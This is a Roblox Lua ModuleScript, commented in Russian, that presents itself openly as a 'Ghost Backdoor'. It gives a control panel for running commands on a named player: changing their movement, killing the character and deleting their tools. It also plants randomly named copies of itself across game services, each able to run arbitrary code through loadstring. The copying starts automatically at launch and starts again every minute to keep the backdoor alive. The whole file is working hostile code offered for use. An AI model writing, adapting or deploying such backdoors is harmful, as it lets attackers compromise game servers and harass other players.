-- ModuleScript в ReplicatedStorage назови "GhostBackdoor"
local BackdoorModule = {}

local function generateRandomName()
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local name = ""
    for i = 1, 8 do
        name = name .. chars:sub(math.random(1, #chars), math.random(1, #chars))
    end
    return name
end

function BackdoorModule.Init()
    print("[GhostBackdoor] System initialization started...")
    
    -- Создание основного GUI
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    
    local ScreenGui = Instance.new("ScreenGui")
    local MainFrame = Instance.new("Frame")
    local Title = Instance.new("TextLabel")
    local LogFrame = Instance.new("ScrollingFrame")
    local TargetBox = Instance.new("TextBox")
    local ExecuteBtn = Instance.new("TextButton")
    local ReplicateBtn = Instance.new("TextButton")
    local StatusLabel = Instance.new("TextLabel")
    
    ScreenGui.Name = "GhostBackdoorGUI"
    ScreenGui.Parent = PlayerGui
    ScreenGui.ResetOnSpawn = false

    MainFrame.Size = UDim2.new(0, 400, 0, 500)
    MainFrame.Position = UDim2.new(0, 10, 0, 10)
    MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui

    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Title.Text = "Ghost Backdoor System"
    Title.TextColor3 = Color3.new(1, 1, 1)
    Title.TextSize = 14
    Title.Parent = MainFrame

    LogFrame.Size = UDim2.new(1, -20, 0, 200)
    LogFrame.Position = UDim2.new(0, 10, 0, 40)
    LogFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    LogFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    LogFrame.ScrollBarThickness = 5
    LogFrame.Parent = MainFrame

    TargetBox.Size = UDim2.new(1, -20, 0, 30)
    TargetBox.Position = UDim2.new(0, 10, 0, 250)
    TargetBox.PlaceholderText = "Введите имя игрока..."
    TargetBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    TargetBox.TextColor3 = Color3.new(1, 1, 1)
    TargetBox.Parent = MainFrame

    ExecuteBtn.Size = UDim2.new(1, -20, 0, 40)
    ExecuteBtn.Position = UDim2.new(0, 10, 0, 290)
    ExecuteBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
    ExecuteBtn.Text = "ВЫПОЛНИТЬ НА ИГРОКЕ"
    ExecuteBtn.TextColor3 = Color3.new(1, 1, 1)
    ExecuteBtn.TextSize = 12
    ExecuteBtn.Parent = MainFrame

    ReplicateBtn.Size = UDim2.new(1, -20, 0, 40)
    ReplicateBtn.Position = UDim2.new(0, 10, 0, 340)
    ReplicateBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    ReplicateBtn.Text = "ЗАПУСТИТЬ РЕПЛИКАЦИЮ"
    ReplicateBtn.TextColor3 = Color3.new(1, 1, 1)
    ReplicateBtn.TextSize = 12
    ReplicateBtn.Parent = MainFrame

    StatusLabel.Size = UDim2.new(1, -20, 0, 100)
    StatusLabel.Position = UDim2.new(0, 10, 0, 390)
    StatusLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    StatusLabel.TextColor3 = Color3.new(1, 1, 1)
    StatusLabel.Text = "Статус: Система активна\nGhost Backdoor v2.0\nОжидание команд..."
    StatusLabel.TextWrapped = true
    StatusLabel.TextSize = 11
    StatusLabel.Parent = MainFrame

    -- Функция для добавления логов в GUI
    local function addLog(message, color)
        local logLabel = Instance.new("TextLabel")
        logLabel.Size = UDim2.new(1, -10, 0, 20)
        logLabel.Position = UDim2.new(0, 5, 0, #LogFrame:GetChildren() * 20)
        logLabel.BackgroundTransparency = 1
        logLabel.Text = "> " .. message
        logLabel.TextColor3 = color or Color3.new(1, 1, 1)
        logLabel.TextXAlignment = Enum.TextXAlignment.Left
        logLabel.Font = Enum.Font.Code
        logLabel.TextSize = 10
        logLabel.Parent = LogFrame
        
        LogFrame.CanvasSize = UDim2.new(0, 0, 0, #LogFrame:GetChildren() * 20)
        LogFrame.CanvasPosition = Vector2.new(0, LogFrame.CanvasSize.Y.Offset)
        
        print("[GhostBackdoor] " .. message)
    end

    -- Функция репликации
    local function replicateBackdoor()
        addLog("Запуск репликации...", Color3.new(1, 1, 0))
        
        local replicationTargets = {
            game:GetService("ReplicatedStorage"),
            game:GetService("ServerScriptService"),
            game:GetService("Workspace"),
            game:GetService("Lighting"),
            game:GetService("StarterPack"),
            game:GetService("StarterPlayer"):FindFirstChild("StarterPlayerScripts")
        }

        local createdCount = 0
        for i = 1, 12 do
            local target = replicationTargets[math.random(1, #replicationTargets)]
            if target then
                local moduleName = generateRandomName()
                local newModule = Instance.new("ModuleScript")
                newModule.Name = moduleName
                
                newModule.Source = [[
local module = {}
print("[GhostBackdoor] Module ]] .. moduleName .. [[ loaded")

function module.Execute(cmd)
    print("[GhostBackdoor] Executing: " .. cmd)
    local success, result = pcall(loadstring(cmd))
    if success then
        print("[GhostBackdoor] Command executed successfully")
    else
        print("[GhostBackdoor] Error: " .. tostring(result))
    end
    return success, result
end

return module
]]
                local success = pcall(function()
                    newModule.Parent = target
                    createdCount = createdCount + 1
                    addLog("Создан: " .. newModule:GetFullName(), Color3.new(0, 1, 0))
                end)
            end
        end
        
        addLog("Репликация завершена. Создано: " .. createdCount .. " модулей", Color3.new(0, 1, 0))
        StatusLabel.Text = "Статус: Репликация завершена\nСоздано модулей: " .. createdCount .. "\nСистема активна"
    end

    -- Функция выполнения на игроке
    local function executeOnPlayer(username)
        addLog("Цель: " .. username, Color3.new(1, 1, 0))
        
        local commands = {
            "local p = game:GetService('Players'):FindFirstChild('" .. username .. "'); if p and p.Character then p.Character.Humanoid.WalkSpeed = 50 end",
            "local p = game:GetService('Players'):FindFirstChild('" .. username .. "'); if p and p.Character then p.Character.Humanoid.JumpPower = 100 end",
            "local p = game:GetService('Players'):FindFirstChild('" .. username .. "'); if p and p.Character then p.Character.Humanoid.Health = 0 end",
            "local p = game:GetService('Players'):FindFirstChild('" .. username .. "'); if p then for i,v in pairs(p:GetChildren()) do if v:IsA('Tool') then v:Destroy() end end end"
        }
        
        local successCount = 0
        for i, cmd in ipairs(commands) do
            local success, result = pcall(loadstring(cmd))
            if success then
                addLog("Команда " .. i .. " выполнена успешно", Color3.new(0, 1, 0))
                successCount = successCount + 1
                print("[GhostBackdoor] Command " .. i .. " executed on " .. username)
            else
                addLog("Ошибка команды " .. i .. ": " .. tostring(result), Color3.new(1, 0, 0))
            end
        end
        
        addLog("Выполнение завершено. Успешно: " .. successCount .. "/" .. #commands, Color3.new(0, 1, 1))
        StatusLabel.Text = "Статус: Выполнено на " .. username .. "\nУспешных команд: " .. successCount .. "/" .. #commands .. "\nСистема активна"
        
        print("[GhostBackdoor] Execution completed on " .. username .. " - " .. successCount .. "/" .. #commands .. " commands")
    end

    -- Обработчики кнопок
    ExecuteBtn.MouseButton1Click:Connect(function()
        local targetName = TargetBox.Text
        if targetName ~= "" then
            executeOnPlayer(targetName)
        else
            addLog("Ошибка: Введите имя игрока", Color3.new(1, 0, 0))
        end
    end)

    ReplicateBtn.MouseButton1Click:Connect(function()
        replicateBackdoor()
    end)

    -- Автоматическая репликация при старте
    spawn(function()
        wait(3)
        replicateBackdoor()
    end)

    -- Система мониторинга
    spawn(function()
        while true do
            wait(60)
            local moduleCount = 0
            local function countModules(parent)
                for _, child in ipairs(parent:GetChildren()) do
                    if child:IsA("ModuleScript") and child.Source:find("GhostBackdoor") then
                        moduleCount = moduleCount + 1
                    end
                    countModules(child)
                end
            end
            
            countModules(game)
            
            if moduleCount < 5 then
                addLog("Обнаружено мало модулей. Запуск авторепликации...", Color3.new(1, 0.5, 0))
                replicateBackdoor()
            else
                addLog("Проверка системы: " .. moduleCount .. " модулей активны", Color3.new(0, 1, 0))
            end
        end
    end)

    addLog("Система Ghost Backdoor инициализирована", Color3.new(0, 1, 0))
    StatusLabel.Text = "Статус: Система активна\nGhost Backdoor v2.0\nGUI загружено"
    print("[GhostBackdoor] System fully initialized with GUI")
end

return BackdoorModule
